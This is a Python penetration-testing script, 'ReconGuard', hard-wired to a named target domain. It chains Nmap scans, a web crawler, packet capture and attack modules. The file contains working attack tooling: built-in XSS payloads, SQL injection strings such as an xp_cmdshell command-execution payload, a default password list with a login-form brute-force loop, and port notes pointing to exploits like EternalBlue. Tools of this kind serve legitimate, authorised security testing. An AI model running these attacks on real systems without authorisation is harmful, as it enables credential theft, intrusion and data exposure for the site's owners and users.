#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RECON GUARD - ULTIMATE KALI LINUX SUITE
=======================================
A unified security tool combining the power of Nmap, custom Web Spidering,
Packet Sniffing, and Vulnerability Analysis into a single CLI utility.

Generated by ReconGuard Dashboard
Target: bhoshackathon.com
"""

import sys
import os
import argparse
import subprocess
import threading
import time
import socket
import re
import json
import random
import string
import shlex
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

# --- COLOR CONSTANTS ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- PORT NOTES ---
COMMON_PORT_NOTES = {
    20: "FTP-Data: Unencrypted file transfer channel, leaks files/credentials.",
    21: "FTP-Control: Plaintext auth; check for anonymous login or weak creds.",
    22: "SSH: Secure shell; brute-force risk, look for outdated ciphers and reuse.",
    23: "Telnet: Completely unencrypted remote shell—treat as critical finding.",
    25: "SMTP: Email relay; verify auth, open-relay, spoofing, VRFY, command exec.",
    53: "DNS: Inspect zone transfers (AXFR) and cache poisoning exposure.",
    80: "HTTP: Cleartext web; crawl for vulns, inspect headers, try HTTP downgrade.",
    110: "POP3: Mail retrieval; plaintext credentials unless TLS enforced.",
    111: "RPCbind: Enumerate NFS/Mountd; often leads to file disclosure.",
    135: "MS RPC: Often paired with SMB exploits (EternalBlue, etc.).",
    139: "NetBIOS/SMB: Weak shares, NULL sessions, relay attacks.",
    143: "IMAP: Check STARTTLS, weak auth, mail harvesting.",
    161: "SNMP: Community strings leak configs; try public/private defaults.",
    389: "LDAP: Directory service; weak binds reveal user/org data.",
    443: "HTTPS: Review TLS config, certs, and web app vulns.",
    445: "SMB: High-value target; test for SMB signing, relay, MS17-010.",
    465: "SMTPS: Ensure modern ciphers, no downgrade; still check auth.",
    500: "ISAKMP/VPN: Try aggressive mode PSK dumping, weak phase-1.",
    587: "Submission: Auth-enabled SMTP; watch for spoofing misconfig.",
    631: "IPP/Printing: Enumerate printers, creds, file shares.",
    636: "LDAPS: Secure LDAP, still check for weak binds or fallback.",
    8080: "HTTP-Alt: Proxies/app servers (JBoss, Tomcat) often reside here.",
    8443: "HTTPS-Alt: Admin consoles; test for weak auth and misconfig.",
    1433: "MSSQL: Try default creds, xp_cmdshell, weak SA passwords.",
    1521: "Oracle: TNS listener info leak, default creds.",
    1723: "PPTP VPN: MS-CHAPv2 weak crypto susceptible to capture.",
    2049: "NFS: World-readable exports leak sensitive data.",
    2375: "Docker API: Remote container control without auth.",
    3306: "MySQL: Default creds/common injection platform.",
    3389: "RDP: Bruteforce & NTLM relay; check NLA and patched state.",
    5432: "PostgreSQL: Default creds; try `postgres` user.",
    5900: "VNC: Often no password or weak auth, gives desktop access.",
    5985: "WinRM HTTP: Remote PowerShell; requires strong auth.",
    5986: "WinRM HTTPS: Secure PowerShell endpoint; still abuseable.",
    6379: "Redis: No auth by default; remote command execution risk.",
    8081: "HTTP mgmt: Jenkins/Splunk consoles show up here.",
    9200: "Elasticsearch: Data exfiltration via open REST API.",
    11211: "Memcached: Reflection/amplification vector, data leak.",
    27017: "MongoDB: Check for unauthenticated admin access.",
}

# --- DEPENDENCY CHECK ---
def check_deps():
    missing = []
    try:
        import requests
    except ImportError:
        missing.append("requests")
    
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        missing.append("beautifulsoup4")

    try:
        from scapy.all import sniff, wrpcap, Ether, IP, TCP, UDP
    except ImportError:
        missing.append("scapy")

    if missing:
        print(f"{Colors.FAIL}[!] Missing Python dependencies: {', '.join(missing)}{Colors.ENDC}")
        print(f"    Run: pip3 install {' '.join(missing)}")
        sys.exit(1)
        
    # Check for Nmap
    if subprocess.call("which nmap", shell=True, stdout=subprocess.DEVNULL) != 0:
        print(f"{Colors.FAIL}[!] Nmap binary not found in PATH.{Colors.ENDC}")
        print("    Please install: sudo apt install nmap")
        sys.exit(1)

# Import after check
try:
    import requests
    from bs4 import BeautifulSoup
    from scapy.all import sniff, wrpcap, IP, TCP, UDP
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass # Handled in check_deps

# --- LOGGER ---
def log(msg, level="INFO"):
    timestamp = time.strftime("%H:%M:%S")
    if level == "INFO":
        print(f"[{timestamp}] {Colors.BLUE}[*]{Colors.ENDC} {msg}")
    elif level == "SUCCESS":
        print(f"[{timestamp}] {Colors.GREEN}[+]{Colors.ENDC} {msg}")
    elif level == "WARN":
        print(f"[{timestamp}] {Colors.WARNING}[!]{Colors.ENDC} {msg}")
    elif level == "ERROR":
        print(f"[{timestamp}] {Colors.FAIL}[-]{Colors.ENDC} {msg}")

# --- WORDLIST LOADER ---
def load_wordlist(paths, fallback):
    """
    Attempt to read wordlist entries from the first existing path in `paths`.
    Return fallback list if none found.
    """
    for path in paths:
        if path and os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as handle:
                    entries = [line.strip() for line in handle if line.strip()]
                    if entries:
                        log(f"Loaded {len(entries)} payloads from {path}", "SUCCESS")
                        return entries
            except Exception as exc:
                log(f"Failed to read wordlist {path}: {exc}", "WARN")
    log("Falling back to built-in payload list.", "WARN")
    return fallback[:]

def prompt_yes_no(question):
    """
    Simple interactive prompt. Returns True if user answers yes.
    """
    try:
        choice = input(f"{question} (y/N): ").strip().lower()
    except EOFError:
        return False
    return choice in ("y", "yes")

def prompt_int(question, default):
    """
    Prompt user for integer value, fallback to default.
    """
    while True:
        try:
            raw = input(f"{question} [{default}]: ").strip()
        except EOFError:
            return default
        if not raw:
            return default
        if raw.isdigit() and int(raw) > 0:
            return int(raw)
        print("Please enter a positive integer.")

def ensure_wordlist(path, description, install_hint):
    if not os.path.isfile(path):
        print(f"{Colors.FAIL}[!] Missing {description} wordlist: {path}{Colors.ENDC}")
        print(f"    Install with: {install_hint}")
        print(f"    Expected to find file at: {path}")
        sys.exit(1)

# ==========================================
# MODULE 1: NMAP WRAPPER (The "Muscle")
# ==========================================
class NmapScanner:
    def __init__(self, target, aggressive=True, all_ports=False, extra_args=None):
        self.target = target
        self.aggressive = aggressive
        self.all_ports = all_ports
        self.output_file = f"nmap_{target}.xml"
        self.extra_args = extra_args or []

    def run(self):
        log(f"Starting Nmap Scan against {self.target}...", "INFO")

        # Build command based on flags
        cmd = ["nmap"]

        if self.extra_args:
            cmd.extend(self.extra_args)
        else:
            if self.aggressive:
                cmd.append("-A") # Aggressive: OS detection, version detection, script scanning, traceroute
                cmd.append("-T4") # Timing template (faster)
            else:
                cmd.append("-sV") # Service version only
                cmd.append("-O")  # OS detection

            if self.all_ports:
                cmd.append("-p-")
            else:
                cmd.append("--top-ports")
                cmd.append("1000")

        # Output format
        cmd.extend(["-oX", self.output_file, self.target])

        log(f"Executing: {' '.join(cmd)}", "INFO")

        stdout_lines = []
        stderr_lines = []

        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Stream output
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    cleaned = output.strip()
                    stdout_lines.append(cleaned)
                    print(f"    {cleaned}")

            stderr_lines = [line.strip() for line in process.stderr.readlines() if line.strip()]

            rc = process.poll()
            if rc == 0:
                log("Nmap scan completed successfully.", "SUCCESS")
            else:
                log("Nmap exited with errors.", "ERROR")
            return {
                "command": " ".join(cmd),
                "return_code": rc,
                "stdout": "\n".join(stdout_lines),
                "stderr": "\n".join(stderr_lines),
                "xml_path": os.path.abspath(self.output_file)
            }

        except Exception as e:
            log(f"Nmap execution failed: {e}", "ERROR")
            return {
                "command": " ".join(cmd),
                "return_code": 1,
                "stdout": "",
                "stderr": str(e),
                "xml_path": ""
            }

    def parse_xml(self):
        # Basic parsing for summary (requires lxml or xml.etree)
        # We'll stick to text feedback for CLI simplicity
        pass

# ==========================================
# MODULE 2: BURP-LIKE SPIDER & SCANNER
# ==========================================
class WebSpider:
    def __init__(self, target_url, depth=2, check_vulns=True,
                 sqli_wordlist=None, xss_wordlist=None,
                 brute_wordlist=None):
        self.base_url = target_url
        self.domain = urlparse(target_url).netloc
        self.depth = depth
        self.check_vulns = check_vulns
        self.visited = set()
        self.findings = []
        self.lock = threading.Lock()

        # Payloads for fuzzing (wordlists override defaults)
        default_xss = [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '<script>alert(1)</script>',
            '"><svg onload=alert(1)>',
            '\'\"><iframe src=javascript:alert(1)>',
            '"><body onload=alert(1)>',
            '"><details open ontoggle=alert(1)>'
        ]
        default_sqli = [
            "'",
            "'--",
            '";',
            "'; exec master..xp_cmdshell('whoami')--",
            "'||'='",
            "') WAITFOR DELAY '0:0:5'--",
            "'+UNION+SELECT+NULL--"
        ]

        self.xss_payloads = xss_wordlist or default_xss
        self.sqli_payloads = sqli_wordlist or default_sqli
        default_brute = [
            "admin", "password", "123456", "letmein", "qwerty",
            "administrator", "root", "welcome", "passw0rd", "changeme"
        ]
        self.brute_wordlist = brute_wordlist or default_brute
        self.common_usernames = ["admin", "administrator", "root", "test", "user"]
        self.max_brute_attempts = 400
        self.forms = []
        self.param_urls = set()
        self.bruteforce_hits = []
        self.xss_hits = []
        self.sqli_hits = []
        self.id_indicators = set()
        self.form_signatures = set()

    def crawl(self, url, current_depth):
        if current_depth > self.depth or url in self.visited:
            return
        
        with self.lock:
            self.visited.add(url)
        
        log(f"Crawling: {url}", "INFO")
        
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (ReconGuard CLI)'}
            res = requests.get(url, headers=headers, timeout=5, verify=False)
            self.record_param_url(url)
            
            # 1. Header Analysis
            self.check_headers(url, res.headers)
            
            soup = BeautifulSoup(res.text, 'html.parser')
            
            # 2. Form Analysis & Vulnerability Injection
            if self.check_vulns:
                self.scan_forms(url, soup)

            # 3. Recursive Link Extraction
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                full_url = urljoin(url, href)
                self.record_param_url(full_url)
                
                # Stay in scope
                if urlparse(full_url).netloc == self.domain:
                    self.crawl(full_url, current_depth + 1)
                    
        except Exception as e:
            # log(f"Failed to crawl {url}: {e}", "WARN")
            pass

    def check_headers(self, url, headers):
        if 'Content-Security-Policy' not in headers:
            self.add_finding(url, "Missing Content-Security-Policy (CSP)", "Medium")
        if 'X-Frame-Options' not in headers:
            self.add_finding(url, "Missing X-Frame-Options (Clickjacking Risk)", "Low")

    def scan_forms(self, url, soup):
        forms = soup.find_all('form')
        for i, form in enumerate(forms):
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            textareas = form.find_all('textarea')
            input_elements = inputs + textareas
            fields_meta = []
            
            log(f"Found form at {url} -> {action} ({method})", "INFO")
            
            # CSRF Check
            if method == 'post':
                is_csrf_protected = any('csrf' in i.get('name', '').lower() for i in inputs)
                if not is_csrf_protected:
                    self.add_finding(url, f"Form to {action} missing Anti-CSRF token", "Medium")
            
            # Build target URL
            target_endpoint = urljoin(url, action)
            for element in input_elements:
                field_name = element.get('name')
                raw_type = element.get('type') if hasattr(element, "get") else None
                field_type = (raw_type or 'text').lower()
                fields_meta.append({
                    "name": field_name,
                    "type": field_type
                })
                if field_name and 'id' in field_name.lower():
                    self.id_indicators.add(field_name.lower())

            signature = (
                target_endpoint,
                method,
                tuple(sorted((field["name"] or f"field_{idx}") for idx, field in enumerate(fields_meta)))
            )
            if signature in self.form_signatures:
                log(f"Skipping duplicate form at {target_endpoint}", "WARN")
                continue
            self.form_signatures.add(signature)

            self.forms.append({
                "source": url,
                "endpoint": target_endpoint,
                "method": method,
                "fields": fields_meta
            })

    def identify_login_fields(self, elements):
        username_field = None
        password_field = None
        for element in elements:
            if hasattr(element, "get"):
                field_name = element.get('name')
                raw_type = element.get('type')
            else:
                field_name = element.get("name")
                raw_type = element.get("type")
            if not field_name:
                continue
            field_type = (raw_type or "text").lower()
            lowered = field_name.lower()

            if not password_field and (field_type == 'password' or 'pass' in lowered):
                password_field = field_name

            if not username_field:
                if any(token in lowered for token in ["user", "email", "login", "name"]):
                    username_field = field_name
                elif field_type in ("text", "email"):
                    username_field = field_name
        return username_field, password_field

    def brute_force_login(self, form_info, password_subset):
        username_field, password_field = self.identify_login_fields(form_info["fields"])
        if not (username_field and password_field):
            return

        endpoint = form_info["endpoint"]
        method = form_info["method"]
        failure_tokens = ["invalid", "incorrect", "failed", "unauthorized", "error"]
        success_tokens = ["dashboard", "welcome", "logout", "success"]
        headers = {'User-Agent': 'Mozilla/5.0 (ReconGuard CLI)'}

        for username in self.common_usernames:
            for password in password_subset:
                payload = {
                    username_field: username,
                    password_field: password
                }
                try:
                    if method == 'post':
                        res = requests.post(endpoint, data=payload, headers=headers, timeout=6, verify=False, allow_redirects=False)
                    else:
                        res = requests.get(endpoint, params=payload, headers=headers, timeout=6, verify=False, allow_redirects=False)

                    body = res.text.lower()
                    if any(token in body for token in failure_tokens):
                        continue
                    if res.status_code in (200, 302) or any(token in body for token in success_tokens):
                        finding = f"Login form may accept weak credentials ({username}:{password})"
                        self.add_finding(endpoint, finding, "Critical")
                        log(f"[BRUTE] {endpoint} -> {username}:{password}", "SUCCESS")
                        self.bruteforce_hits.append({
                            "endpoint": endpoint,
                            "username": username,
                            "password": password
                        })
                        return
                except Exception:
                    continue
        log(f"No weak credentials found for {endpoint}", "WARN")

    def try_sqli_payloads(self, endpoint, method, field, payloads):
        for payload in payloads:
            data = {field: payload}
            try:
                res = self.dispatch_request(endpoint, method, data)
                if self.detect_sqli_response(res.text):
                    msg = f"Possible SQLi via field '{field}' using payload: {payload[:40]}"
                    self.add_finding(endpoint, msg, "High")
                    log(f"[SQLi] {endpoint} field={field}", "SUCCESS")
                    self.sqli_hits.append({
                        "location": f"{endpoint} (field {field})",
                        "payload": payload
                    })
                    break
            except Exception:
                continue

    def try_xss_payloads(self, endpoint, method, field, payloads):
        for payload in payloads:
            data = {field: payload}
            try:
                res = self.dispatch_request(endpoint, method, data)
                if self.detect_xss_reflection(payload, res.text):
                    msg = f"Reflected XSS suspected via field '{field}' using payload: {payload[:40]}"
                    self.add_finding(endpoint, msg, "High")
                    log(f"[XSS] {endpoint} field={field}", "SUCCESS")
                    self.xss_hits.append({
                        "location": f"{endpoint} (field {field})",
                        "payload": payload
                    })
                    break
            except Exception:
                continue

    def dispatch_request(self, endpoint, method, data):
        headers = {'User-Agent': 'Mozilla/5.0 (ReconGuard CLI)'}
        if method == 'post':
            return requests.post(endpoint, data=data, headers=headers, timeout=6, verify=False)
        return requests.get(endpoint, params=data, headers=headers, timeout=6, verify=False)

    def detect_sqli_response(self, text):
        indicators = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "syntax error",
            "psql: FATAL",
            "sqlstate"
        ]
        lower_text = text.lower()
        return any(indicator in lower_text for indicator in indicators)

    def detect_xss_reflection(self, payload, text):
        return payload.lower() in text.lower()

    def record_param_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            self.param_urls.add(parsed.geturl())
            for param in params:
                if 'id' in param.lower():
                    self.id_indicators.add(param.lower())

    def run_bruteforce_attacks(self, guess_limit):
        if not self.forms or not self.brute_wordlist:
            log("No forms available for brute-force testing.", "WARN")
            return
        password_subset = self.brute_wordlist[:guess_limit]
        if not password_subset:
            log("Brute-force wordlist empty after applying limit.", "WARN")
            return
        for form in self.forms:
            self.brute_force_login(form, password_subset)

    def run_xss_checks(self, payload_limit):
        if not self.forms:
            log("No forms available for XSS testing.", "WARN")
            return
        payload_subset = self.xss_payloads[:payload_limit]
        if not payload_subset:
            log("XSS payload list empty after applying limit.", "WARN")
            return
        for form in self.forms:
            endpoint = form["endpoint"]
            method = form["method"]
            for field in form["fields"]:
                field_name = field.get("name")
                if not field_name:
                    continue
                self.try_xss_payloads(endpoint, method, field_name, payload_subset)

    def run_sqli_checks(self, payload_limit):
        payload_subset = self.sqli_payloads[:payload_limit]
        if not payload_subset:
            log("SQLi payload list empty after applying limit.", "WARN")
            return
        target_count = 0
        for form in self.forms:
            endpoint = form["endpoint"]
            method = form["method"]
            for field in form["fields"]:
                field_name = field.get("name")
                if not field_name:
                    continue
                self.try_sqli_payloads(endpoint, method, field_name, payload_subset)
                target_count += 1
        for url in self.param_urls:
            self.test_param_url(url, payload_subset)
        if target_count == 0 and not self.param_urls:
            log("No SQLi targets discovered.", "WARN")

    def test_param_url(self, url, payload_subset):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param in params:
            for payload in payload_subset:
                new_query = params.copy()
                new_query[param] = payload
                fuzz_url = parsed._replace(query=urlencode(new_query, doseq=True)).geturl()
                try:
                    res = requests.get(fuzz_url, timeout=3, verify=False)
                    if self.detect_sqli_response(res.text):
                         self.add_finding(fuzz_url, f"Possible SQLi in parameter '{param}'", "Critical")
                         log(f"[SQLi] {fuzz_url} param={param}", "SUCCESS")
                         self.sqli_hits.append({
                             "location": f"{fuzz_url} (param {param})",
                             "payload": payload
                         })
                         break
                except Exception:
                    continue

    def add_finding(self, url, issue, severity):
        self.findings.append({'url': url, 'issue': issue, 'severity': severity})

# ==========================================
# MODULE 3: PACKET SNIFFER (Wireshark-Lite)
# ==========================================
class SnifferThread(threading.Thread):
    def __init__(self, interface, target_ip, duration=30):
        super().__init__()
        self.interface = interface
        self.target_ip = target_ip
        self.duration = duration
        self.pcap_file = f"capture_{target_ip}.pcap"
        self.stop_event = threading.Event()
        self.capture_info = {
            "packet_count": 0,
            "pcap_path": "",
            "error": ""
        }

    def run(self):
        log(f"Starting Packet Capture on {self.interface} for {self.duration}s...", "INFO")
        log(f"Filter: host {self.target_ip}", "INFO")

        packets = []

        def packet_callback(pkt):
            packets.append(pkt)
            if pkt.haslayer(IP):
                src = pkt[IP].src
                dst = pkt[IP].dst
                # summary = pkt.summary()
                # print(f"    [PKT] {src} -> {dst}")

        try:
            sniff(
                filter=f"host {self.target_ip}",
                prn=packet_callback,
                timeout=self.duration,
                store=0
            )
            
            # Save to file
            if packets:
                wrpcap(self.pcap_file, packets)
                log(f"Captured {len(packets)} packets. Saved to {self.pcap_file}", "SUCCESS")
                self.capture_info["packet_count"] = len(packets)
                self.capture_info["pcap_path"] = os.path.abspath(self.pcap_file)
            else:
                log("No packets captured.", "WARN")
                self.capture_info["packet_count"] = 0
                self.capture_info["pcap_path"] = ""
                
        except Exception as e:
            log(f"Sniffer Error (Root required?): {e}", "ERROR")
            self.capture_info["error"] = str(e)


class ReportWriter:
    def __init__(self, path="pen_result"):
        self.path = os.path.abspath(path)
        self.sections = []

    def add_section(self, title, body):
        self.sections.append((title, body))

    def write(self):
        with open(self.path, "w", encoding="utf-8") as report:
            report.write("===== ReconGuard Penetration Report =====\n")
            for title, body in self.sections:
                heading = title.upper()
                underline = "_" * len(heading)
                report.write(f"\n{heading}\n{underline}\n")
                report.write(body.strip() + "\n")
        log(f"Report saved to {self.path}", "SUCCESS")

# ==========================================
# MAIN ORCHESTRATOR
# ==========================================
def main():
    parser = argparse.ArgumentParser(description="ReconGuard - The Ultimate CLI Recon Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP or Domain")
    parser.add_argument("--interface", default="eth0", help="Network interface for sniffing")
    parser.add_argument("--skip-nmap", action="store_true", help="Skip Nmap scan")
    parser.add_argument("--skip-spider", action="store_true", help="Skip Web Spider")
    parser.add_argument("--skip-sniff", action="store_true", help="Skip Packet Sniffing")
    parser.add_argument("--nmap-args", default="", help="Custom Nmap arguments (overrides defaults)")
    parser.add_argument("--sqli-wordlist", default="/usr/share/seclists/Fuzzing/SQL Injection/Generic-SQLi.txt",
                        help="Path to SQLi payload wordlist (defaults to SecLists Generic-SQLi)")
    parser.add_argument("--xss-wordlist", default="/usr/share/seclists/Fuzzing/XSS/XSS-Common.txt",
                        help="Path to XSS payload wordlist (defaults to SecLists XSS-Common)")
    parser.add_argument("--bruteforce-wordlist", default="/usr/share/seclists/Passwords/Common-Credentials/common.txt",
                        help="Path to credential brute-force wordlist (defaults to SecLists common.txt)")
    
    args = parser.parse_args()
    
    # Banner
    print(f"""{Colors.GREEN}
    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    
    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    
    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    
    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    
    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║    
    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝    
            GUARD EDITION v2.0
    {Colors.ENDC}""")
    
    check_deps()

    target = args.target
    report = ReportWriter()

    # Resolve Target
    try:
        target_ip = socket.gethostbyname(target)
        log(f"Target {target} resolved to {target_ip}", "INFO")
        report.add_section(
            "Scan Context",
            f"Target Host: {target}\nResolved IP: {target_ip}\nInterface: {args.interface}\nStarted: {datetime.utcnow().isoformat()}Z"
        )
    except:
        log("Could not resolve target. Exiting.", "ERROR")
        sys.exit(1)

    sniffer_info = None

    # 1. Run Nmap (Foreground - blocking)
    if not args.skip_nmap:
        extra_args = shlex.split(args.nmap_args) if args.nmap_args else None
        scanner = NmapScanner(target_ip, aggressive=True, extra_args=extra_args)
        nmap_result = scanner.run()
        nmap_report = [
            f"Command Status : {'Success' if nmap_result['return_code'] == 0 else 'Failed'}",
            f"Command Line   : {nmap_result['command']}",
            f"XML Output     : {nmap_result['xml_path'] or 'Unavailable'}",
            "",
            "[STDOUT]",
            nmap_result["stdout"] or "No stdout captured.",
        ]
        if nmap_result["stderr"]:
            nmap_report.extend(["", "[STDERR]", nmap_result["stderr"]])
        report.add_section("NMAP", "\n".join(nmap_report))

    # 2. Run Spider (Foreground - blocking)
    if not args.skip_spider:
        ensure_wordlist(
            args.sqli_wordlist,
            "SQL Injection (SecLists Generic-SQLi)",
            "sudo apt install seclists"
        )
        ensure_wordlist(
            args.xss_wordlist,
            "XSS (SecLists XSS-Common)",
            "sudo apt install seclists"
        )
        ensure_wordlist(
            args.bruteforce_wordlist,
            "Credential brute-force (SecLists common.txt)",
            "sudo apt install seclists"
        )
        url = f"http://{target}"
        log("Starting Web Spider/Scanner...", "INFO")
        sqli_payloads = load_wordlist(
            [args.sqli_wordlist],
            [
                "'",
                "'--",
                '";',
                "'; exec master..xp_cmdshell('whoami')--",
                "'||'='",
                "') WAITFOR DELAY '0:0:5'--",
                "'+UNION+SELECT+NULL--"
            ]
        )
        xss_payloads = load_wordlist(
            [args.xss_wordlist],
            [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '<script>alert(1)</script>',
                '"><svg onload=alert(1)>',
                '\'\"><iframe src=javascript:alert(1)>',
                '"><body onload=alert(1)>',
                '"><details open ontoggle=alert(1)>'
            ]
        )
        brute_payloads = load_wordlist(
            [args.bruteforce_wordlist],
            [
                "admin", "password", "123456", "letmein", "qwerty",
                "administrator", "root", "welcome", "passw0rd", "changeme"
            ]
        )
        spider = WebSpider(
            url,
            depth=3,
            check_vulns=True,
            sqli_wordlist=sqli_payloads,
            xss_wordlist=xss_payloads,
            brute_wordlist=brute_payloads
        )
        spider.crawl(url, 0)
        
        log(f"Spider completed. Found {len(spider.findings)} issues.", "SUCCESS")
        for f in spider.findings:
            print(f"    [{f['severity'].upper()}] {f['issue']} ({f['url']})")
        forms_count = len(spider.forms)
        param_count = len(spider.param_urls)
        id_count = len(spider.id_indicators)
        brute_label = os.path.basename(args.bruteforce_wordlist) or args.bruteforce_wordlist

        brute_attempted = False
        xss_attempted = False
        sqli_attempted = False

        if forms_count:
            if prompt_yes_no(f"{forms_count} form(s) detected. Launch credential brute-force using {brute_label}?"):
                brute_attempted = True
                guess_limit = prompt_int("Number of password guesses to try", 25)
                spider.run_bruteforce_attacks(guess_limit)
        else:
            log("No input fields found; skipping brute-force option.", "WARN")

        if forms_count:
            if prompt_yes_no("Run reflected XSS fuzzing against discovered input fields?"):
                xss_attempted = True
                xss_limit = prompt_int("Number of XSS payloads to test", 25)
                spider.run_xss_checks(xss_limit)
        else:
            log("No input fields found; skipping XSS option.", "WARN")

        if id_count or param_count:
            prompt_msg = f"{param_count} parameterized URL(s) / {id_count} id-like field(s) detected. Run SQLi testing?"
            if prompt_yes_no(prompt_msg):
                sqli_attempted = True
                sqli_limit = prompt_int("Number of SQLi payloads to test", 25)
                spider.run_sqli_checks(sqli_limit)
        else:
            log("No ID parameters detected; skipping SQLi option.", "WARN")

        if spider.findings:
            findings_text = "\n".join(
                f"- [{f['severity']}] {f['issue']} => {f['url']}" for f in spider.findings
            )
        else:
            findings_text = "No issues detected within crawl scope."

        burp_lines = [
            f"Pages Crawled : {len(spider.visited)}",
            f"Forms Found   : {forms_count}",
            f"Param URLs    : {param_count}",
            f"ID Indicators : {id_count}",
            "",
            "Findings:",
            findings_text
        ]

        def render_status(title, hits, attempted, formatter):
            if hits:
                lines = [f"{title}:"]
                lines.extend(f"  - {formatter(hit)}" for hit in hits)
                return lines
            if attempted:
                return [f"{title}: Tested, no confirmed findings."]
            return [f"{title}: Not executed."]

        burp_lines.append("")
        burp_lines.extend(render_status(
            "Brute-Force Results",
            spider.bruteforce_hits,
            brute_attempted,
            lambda hit: f"{hit['endpoint']} :: {hit['username']}:{hit['password']}"
        ))
        burp_lines.extend(render_status(
            "XSS Payload Results",
            spider.xss_hits,
            xss_attempted,
            lambda hit: f"{hit['location']} :: {hit['payload']}"
        ))
        burp_lines.extend(render_status(
            "SQLi Payload Results",
            spider.sqli_hits,
            sqli_attempted,
            lambda hit: f"{hit['location']} :: {hit['payload']}"
        ))

        report.add_section(
            "BURP",
            "\n".join(burp_lines)
        )

    # 3. Run Packet Capture (Wireshark-style) last
    if not args.skip_sniff:
        log("Starting Wireshark-style capture after application testing...", "INFO")
        sniffer = SnifferThread(args.interface, target_ip, duration=60)
        sniffer.start()
        sniffer.join()
        sniffer_info = sniffer.capture_info
        sniff_body = [
            f"Interface    : {sniffer.interface}",
            f"Target Filter: host {sniffer.target_ip}",
            f"Duration     : {sniffer.duration}s",
            f"Packets      : {sniffer_info['packet_count']}",
            f"PCAP Path    : {sniffer_info['pcap_path'] or 'Not created'}",
        ]
        if sniffer_info["error"]:
            sniff_body.append(f"Error        : {sniffer_info['error']}")
        report.add_section("WIRESHARK", "\n".join(sniff_body))
    else:
        report.add_section("WIRESHARK", "Packet capture skipped per operator choice.")

    report.add_section(
        "COMMON PORTS",
        "\n".join(
            f"{port}/tcp : {desc}"
            for port, desc in sorted(COMMON_PORT_NOTES.items())
        )
    )
    report.write()

    log("ReconGuard Complete. Check generated reports.", "SUCCESS")

if __name__ == "__main__":
    main()
